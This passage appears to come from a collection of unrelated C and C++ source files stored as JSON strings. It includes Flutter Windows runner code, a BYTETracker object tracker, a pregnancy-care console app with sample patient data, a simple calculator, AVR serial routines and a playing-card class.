UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"BYTETracker.h\"\r\n#include \"lapjv.h\"\r\n\r\nvector<STrack*> BYTETracker::joint_stracks(vector<STrack*> &tlista, vector<STrack> &tlistb)\r\n{\r\n\tmap<int, int> exists;\r\n\tvector<STrack*> res;\r\n\tfor (int i = 0; i < tlista.size(); i++)\r\n\t{\r\n\t\texists.insert(pair<int, int>(tlista[i]->track_id, 1));\r\n\t\tres.push_back(tlista[i]);\r\n\t}\r\n\tfor (int i = 0; i < tlistb.size(); i++)\r\n\t{\r\n\t\tint tid = tlistb[i].track_id;\r\n\t\tif (!exists[tid] || exists.count(tid) == 0)\r\n\t\t{\r\n\t\t\texists[tid] = 1;\r\n\t\t\tres.push_back(&tlistb[i]);\r\n\t\t}\r\n\t}\r\n\treturn res;\r\n}\r\n\r\nvector<STrack> BYTETracker::joint_stracks(vector<STrack> &tlista, vector<STrack> &tlistb)\r\n{\r\n\tmap<int, int> exists;\r\n\tvector<STrack> res;\r\n\tfor (int i = 0; i < tlista.size(); i++)\r\n\t{\r\n\t\texists.insert(pair<int, int>(tlista[i].track_id, 1));\r\n\t\tres.push_back(tlista[i]);\r\n\t}\r\n\tfor (int i = 0; i < tlistb.size(); i++)\r\n\t{\r\n\t\tint tid = tlistb[i].track_id;\r\n\t\tif (!exists[tid] || exists.count(tid) == 0)\r\n\t\t{\r\n\t\t\texists[tid] = 1;\r\n\t\t\tres.push_back(tlistb[i]);\r\n\t\t}\r\n\t}\r\n\treturn res;\r\n}\r\n\r\nvector<STrack> BYTETracker::sub_stracks(vector<STrack> &tlista, vector<STrack> &tlistb)\r\n{\r\n\tmap<int, STrack> stracks;\r\n\tfor (int i = 0; i < tlista.size(); i++)\r\n\t{\r\n\t\tstracks.insert(pair<int, STrack>(tlista[i].track_id, tlista[i]));\r\n\t}\r\n\tfor (int i = 0; i < tlistb.size(); i++)\r\n\t{\r\n\t\tint tid = tlistb[i].track_id;\r\n\t\tif (stracks.count(tid) != 0)\r\n\t\t{\r\n\t\t\tstracks.erase(tid);\r\n\t\t}\r\n\t}\r\n\r\n\tvector<STrack> res;\r\n\tstd::map<int, STrack>::iterator  it;\r\n\tfor (it = stracks.begin(); it != stracks.end(); ++it)\r\n\t{\r\n\t\tres.push_back(it->second);\r\n\t}\r\n\r\n\treturn res;\r\n}\r\n\r\nvoid BYTETracker::remove_duplicate_stracks(vector<STrack> &resa, vector<STrack> &resb, vector<STrack> &stracksa, vector<STrack> &stracksb)\r\n{\r\n\tvector<vector<float> > pdist = iou_distance(stracksa, stracksb);\r\n\tvector<pair<int, int> > pairs;\r\n\tfor (int i = 0; i < pdist.size(); i++)\r\n\t{\r\n\t\tfor (int j = 0; j < pdist[i].size(); j++)\r\n\t\t{\r\n\t\t\tif (pdist[i][j] < 0.15)\r\n\t\t\t{\r\n\t\t\t\tpairs.push_back(pair<int, int>(i, j));\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tvector<int> dupa, dupb;\r\n\tfor (int i = 0; i < pairs.size(); i++)\r\n\t{\r\n\t\tint timep = stracksa[pairs[i].first].frame_id - stracksa[pairs[i].first].start_frame;\r\n\t\tint timeq = stracksb[pairs[i].second].frame_id - stracksb[pairs[i].second].start_frame;\r\n\t\tif (timep > timeq)\r\n\t\t\tdupb.push_back(pairs[i].second);\r\n\t\telse\r\n\t\t\tdupa.push_back(pairs[i].first);\r\n\t}\r\n\r\n\tfor (int i = 0; i < stracksa.size(); i++)\r\n\t{\r\n\t\tvector<int>::iterator iter = find(dupa.begin(), dupa.end(), i);\r\n\t\tif (iter == dupa.end())\r\n\t\t{\r\n\t\t\tresa.push_back(stracksa[i]);\r\n\t\t}\r\n\t}\r\n\r\n\tfor (int i = 0; i < stracksb.size(); i++)\r\n\t{\r\n\t\tvector<int>::iterator iter = find(dupb.begin(), dupb.end(), i);\r\n\t\tif (iter == dupb.end())\r\n\t\t{\r\n\t\t\tresb.push_back(stracksb[i]);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid BYTETracker::linear_assignment(vector<vector<float> > &cost_matrix, int cost_matrix_size, int cost_matrix_size_size, float thresh,\r\n\tvector<vector<int> > &matches, vector<int> &unmatched_a, vector<int> &unmatched_b)\r\n{\r\n\tif (cost_matrix.size() == 0)\r\n\t{\r\n\t\tfor (int i = 0; i < cost_matrix_size; i++)\r\n\t\t{\r\n\t\t\tunmatched_a.push_back(i);\r\n\t\t}\r\n\t\tfor (int i = 0; i < cost_matrix_size_size; i++)\r\n\t\t{\r\n\t\t\tunmatched_b.push_back(i);\r\n\t\t}\r\n\t\treturn;\r\n\t}\r\n\r\n\tvector<int> rowsol; vector<int> colsol;\r\n\tfloat c = lapjv(cost_matrix, rowsol, colsol, true, thresh);\r\n\tfor (int i = 0; i < rowsol.size(); i++)\r\n\t{\r\n\t\tif (rowsol[i] >= 0)\r\n\t\t{\r\n\t\t\tvector<int> match;\r\n\t\t\tmatch.push_back(i);\r\n\t\t\tmatch.push_back(rowsol[i]);\r\n\t\t\tmatches.push_back(match);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tunmatched_a.push_back(i);\r\n\t\t}\r\n\t}\r\n\r\n\tfor (int i = 0; i < colsol.size(); i++)\r\n\t{\r\n\t\tif (colsol[i] < 0)\r\n\t\t{\r\n\t\t\tunmatched_b.push_back(i);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvector<vector<float> > BYTETracker::ious(vector<vector<float> > &atlbrs, vector<vector<float> > &btlbrs)\r\n{\r\n\tvector<vector<float> > ious;\r\n\tif (atlbrs.size()*btlbrs.size() == 0)\r\n\t\treturn ious;\r\n\r\n\tious.resize(atlbrs.size());\r\n\tfor (int i = 0; i < ious.size(); i++)\r\n\t{\r\n\t\tious[i].resize(btlbrs.size());\r\n\t}\r\n\r\n\t//bbox_ious\r\n\tfor (int k = 0; k < btlbrs.size(); k++)\r\n\t{\r\n\t\tvector<float> ious_tmp;\r\n\t\tfloat box_area = (btlbrs[k][2] - btlbrs[k][0] + 1)*(btlbrs[k][3] - btlbrs[k][1] + 1);\r\n\t\tfor (int n = 0; n < atlbrs.size(); n++)\r\n\t\t{\r\n\t\t\tfloat iw = min(atlbrs[n][2], btlbrs[k][2]) - max(atlbrs[n][0], btlbrs[k][0]) + 1;\r\n\t\t\tif (iw > 0)\r\n\t\t\t{\r\n\t\t\t\tfloat ih = min(atlbrs[n][3], btlbrs[k][3]) - max(atlbrs[n][1], btlbrs[k][1]) + 1;\r\n\t\t\t\tif(ih > 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tfloat ua = (atlbrs[n][2] - atlbrs[n][0] + 1)*(atlbrs[n][3] - atlbrs[n][1] + 1) + box_area - iw * ih;\r\n\t\t\t\t\tious[n][k] = iw * ih / ua;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tious[n][k] = 0.0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tious[n][k] = 0.0;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\treturn ious;\r\n}\r\n\r\nvector<vector<float> > BYTETracker::iou_distance(vector<STrack*> &atracks, vector<STrack> &btracks, int &dist_size, int &dist_size_size)\r\n{\r\n\tvector<vector<float> > cost_matrix;\r\n\tif (atracks.size() * btracks.size() == 0)\r\n\t{\r\n\t\tdist_size = atracks.size();\r\n\t\tdist_size_size = btracks",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct DietPlan \n{\n    std::string description;\n};\n\n\nstruct ExercisePlan \n{\n    std::string description;\n};\n\nstruct Doctor \n{\n    std::string name;\n    std::string contactNumber;\n};\n\nstruct Patient \n{\n    std::string name;\n    std::string enrollmentDate;\n    std::string contactNumber;\n    std::string disease;\n    std::string pregnancyWeeks;\n    std::string height;\n    std::string weight;\n    Doctor attendingDoctor;\n};\n\nstruct EmergencyContacts\n{\n\tstd::string name;\n\tstd::string contactNumber;\n};\n\nvoid displayDoctors(const std::vector<Doctor>& doctors);\nvoid bookAppointment(const Doctor& doctor);\nvoid viewPatientInfo(const std::vector<Patient>& patients);\nvoid viewPatientInfoIndex(const std::vector<Patient>& patients, int patientChoice);\nvoid viewDietPlanForPregnancy();\nvoid displayEmergencyContacts(const std::vector<EmergencyContacts>& contacts);\n\nint main() \n{\n    std::vector<Doctor> nearbyDoctors;\n    nearbyDoctors.push_back({\"Dr. Khurana\", \"789-222-3333\"});\n    nearbyDoctors.push_back({\"Dr. Arora\", \"987-333-4444\"});\n    nearbyDoctors.push_back({\"Dr. Sharma\", \"986-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Menon\", \"777-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\n\n\n    std::vector<Patient> patients;\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\n\n    std::vector<EmergencyContacts> contacts;\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\n    \n    \n    int choice;\n    int patientChoice;\n\n    do {\n        std::cout <<endl<< \"1. View patient information\\n\";\n        std::cout << \"2. View diet plan for pregnancy\\n\";\n        std::cout << \"3. View exercise plan\\n\";\n        std::cout << \"4. View nearby doctors\\n\";\n        std::cout << \"5. Book an appointment\\n\";\n        std::cout << \"6. View emergency contact numbers\\n\";\n        std::cout << \"7. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) \n\t\t{\n            case 1:\n                viewPatientInfo(patients);\n                break;\n            case 2:\n                viewDietPlanForPregnancy();\n                break;\n            case 3:\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\n               std::cout << \"---------------------------------------------------------------------------\\n\";\n               std::cout << \"Day ",
    "#include<stdio.h>\nvoid funcmul(int*,int*,int*);\nvoid funcdiv(int*,int*,int*);\nvoid funcadd(int*,int*,int*);\nvoid funcsub(int*,int*,int*);\nint main()\n{\n    int mul,sub,div,add;\n     int n1,n2;\n     char op;\n     printf(\"Enter your  first Number :\\n\");\n     scanf(\"%d\",&n1);\n      printf(\"Enter The Operator(*,-,+,/):\\n\");\n     scanf(\" %c\",&op);\n     printf(\"Enter your Second Number:\\n\");\n     scanf(\"%d\",&n2);\n\n\n     if(op=='*'){\n        funcmul(&n1,&n2,&mul);\n        printf(\"Multiplication=%d\",mul);\n        return 0;\n     }if(op=='/'){\n       funcdiv(&n1,&n2,&div);\n         printf(\"Division=%d\",div);\n         return 0;\n     }if(op=='+'){\n      funcadd(&n1,&n2,&add);\n        printf(\"Addition=%d\",add);\n        return 0;\n     }if(op=='-'){\n      funcsub(&n1,&n2,&sub);\n        printf(\"Subtraction=%d\",sub);\n        return 0;\n     }else{\n       printf(\"Invalid\");\n       return 0;\n     }\n\n}\nvoid funcmul(int* n1,int* n2,int* mul){\n\n      *mul=*n1 * *n2;\n}\nvoid funcadd(int* n1,int* n2,int* add){\n\n      *add=*n1 + *n2;\n}\n\nvoid funcsub(int* n1,int* n2,int* sub){\n\n      *sub=*n1 - *n2;\n}\n\nvoid funcdiv(int* n1,int* n2,int* div){\n\n      *div=*n1 / *n2;\n}\n\n\n\n\n",
    "#include <iostream>\n#include <unordered_map>\n#include <utility>\n\nstd::unordered_map<int, int> readKeysMapFromConsole() {\n    int number_of_keys;\n    std::cin >> number_of_keys;\n    std::unordered_map<int, int> keys_endurance(number_of_keys);\n    int curr_endurance;\n    for (int i = 0; i < number_of_keys; ++i) {\n        std::cin >> curr_endurance;\n        keys_endurance.insert(std::make_pair(i, curr_endurance));\n    }\n    return keys_endurance;\n}\n\nvoid pressOnKeys(std::unordered_map<int, int> *keys_endurance) {\n    int number_of_presses;\n    std::cin >> number_of_presses;\n    int curr_press;\n    for (int i = 0; i < number_of_presses; ++i) {\n        std::cin >> curr_press;\n        --(*keys_endurance)[curr_press - 1];\n    }\n}\n\nint main() {\n    std::unordered_map<int, int> keys_endurance = readKeysMapFromConsole();\n    pressOnKeys(&keys_endurance);\n    for (size_t i = 0; i < keys_endurance.size(); ++i) {\n        std::cout << (keys_endurance[i] >= 0 ? \"no\" : \"yes\") << \"\\n\";\n    }\n    return 0;\n}\n",
    "#ifdef __linux__\n\t#include \"Platform/Unix/LinuxPlatform.hpp\"\n\n\t#include <X11/Xlib.h>\n\nnamespace util\n{\n/******************************************************************************\n *\n *****************************************************************************/\nLinuxPlatform::LinuxPlatform()\n{\n\t// TODO: Investigate further\n\tXInitThreads();\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nvoid LinuxPlatform::setIcon(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nvoid LinuxPlatform::toggleFullscreen(const sf::WindowHandle& inHandle, const sf::Uint32 inStyle, const bool inWindowed, const sf::Vector2u& inResolution)\n{\n\tUNUSED(inHandle);\n\tUNUSED(inStyle);\n\tUNUSED(inWindowed);\n\tUNUSED(inResolution);\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nfloat LinuxPlatform::getScreenScalingFactor(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n\treturn 1.0f;\n}\n\n/******************************************************************************\n *\n *****************************************************************************/\nint LinuxPlatform::getRefreshRate(const sf::WindowHandle& inHandle)\n{\n\tUNUSED(inHandle);\n\treturn 59;\n}\n}\n\n#endif // __linux__\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"falci\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"usart.h\"\n#include <avr/io.h> // Include here if avr/io.h is needed for USART functions\n#include \"bit.h\"\n\n#include <stdlib.h>\n\n// Set the baud rate\nvoid usart_init(unsigned int ubrr)\n{\n  UBRR0H = (unsigned char)(ubrr >> 8);\n  UBRR0L = (unsigned char)ubrr;\n  // enable receiver and transmitter\n  UCSR0B = (1 << TXEN0) | (1 << RXEN0);\n  // set frame format: USBS0 = 0b1 2stop bit, UCSZ00 = 0b11 8bit data,\n  UCSR0C = (1 << USBS0) | (3 << UCSZ00);\n}\n\nvoid usart_transmit(unsigned char data)\n{\n  /* Wait for empty transmit buffer */\n  while (!(UCSR0A & (1 << UDRE0)))\n    ;\n  /* Put data into buffer, sends the data */\n  UDR0 = data;\n}\n\nvoid usart_tx_string(const char *pStr)\n{\n  while (*pStr != '\\0')\n  {\n    usart_transmit(*pStr);\n    pStr++;\n  }\n}\n\nvoid usart_tx_float(float x, char num_digits_int, char num_digits_decimal)\n{\n  char num_elements = num_digits_int + num_digits_decimal + 1 + 1; // one decimal point and one null terminator\n  char buffer[num_elements];\n\n  dtostrf(x, num_elements - 1, num_digits_decimal, buffer);\n  buffer[num_elements - 1] = '\\0';\n  usart_tx_string(buffer);\n}\n",
    "// cards.cpp\n// Author: Margaux Blondel\n// Implementation of the classes defined in cards.h\n\n//clubs, diamonds, spades, hearts - -> +\n// a 2 3 4 5 6 7 8 9 10 j q k\n\n#include \"cards.h\"\n#include <map>\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nCard::Card(char character, string number) : \n    number(numberToInt(number)), character(characterToInt(character)) {\n}\n\nCard::Card(Card* c) : \n    number(c->number), character(c->character) {\n}\n\nCard::~Card(){\n}\n\n// operators\nCard Card::operator=(Card c) {\n    return Card(intToCharacter(c.character), intToNumber(c.number));\n}\n\nbool Card::operator==(Card c) const{\n    return (number == c.number && character == c.character);\n}\n\nbool Card::operator<(Card c) const{\n    if (character == c.character){\n        return (number < c.number);\n    }\n    return character < c.character;\n}\n\nbool Card::operator>(Card c) const{\n    if (character == c.character){\n        return (number > c.number);\n    }\n    return character > c.character;\n}\n\n// conversions of the attributes\nint Card::characterToInt(char character) const{\n    map<char,int> charToInt = {{'c',1}, {'d',2}, {'s',3}, {'h',4}, {'0',0}};\n    return charToInt[character];\n}\n\nint Card::numberToInt(string number) const{\n    map<string,int> stringToInt = {{\"a\", 1},{\"2\", 2},{\"3\", 3},{\"4\", 4},{\"5\", 5},{\"6\", 6},\n                    {\"7\", 7},{\"8\", 8},{\"9\", 9},{\"10\", 10},{\"j\", 11},{\"q\", 12},{\"k\", 13},{\"0\",0}};\n    return stringToInt[number];\n}\n\nchar Card::intToCharacter(int character) const{\n    map<int,char> intToChar = {{1,'c'}, {2, 'd'}, {3, 's'}, {4, 'h'},{0,'0'}};\n    return intToChar[character];\n}\n\nstring Card::intToNumber(int number) const{\n    map<int,string> stringToInt = {{1,\"a\"},{2, \"2\"},{3, \"3\"},{4, \"4\"},{5, \"5\"},{6, \"6\"},\n                    {7, \"7\"},{8, \"8\"},{9, \"9\"},{10, \"10\"},{ 11,\"j\"},{12,\"q\"},{13,\"k\"},{0,\"0\"}};\n    return stringToInt[number];\n}\n\n// print functions\nvoid Card::printControl() const{\n    char strCharatere = intToCharacter(this->character);\n    string strNumber = intToNumber(this->number);\n\n    cout << endl << \"Card : \" << strCharatere;\n    cout << \" \" << strNumber;\n    cout << \" (\" << this->character;\n    cout << \" \" << this->number;\n    cout << \")\";\n}\n\nvoid Card::print() const{\n    char strCharatere = intToCharacter(this->character);\n    string strNumber = intToNumber(this->number);\n    cout << strCharatere << \" \" << strNumber;\n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
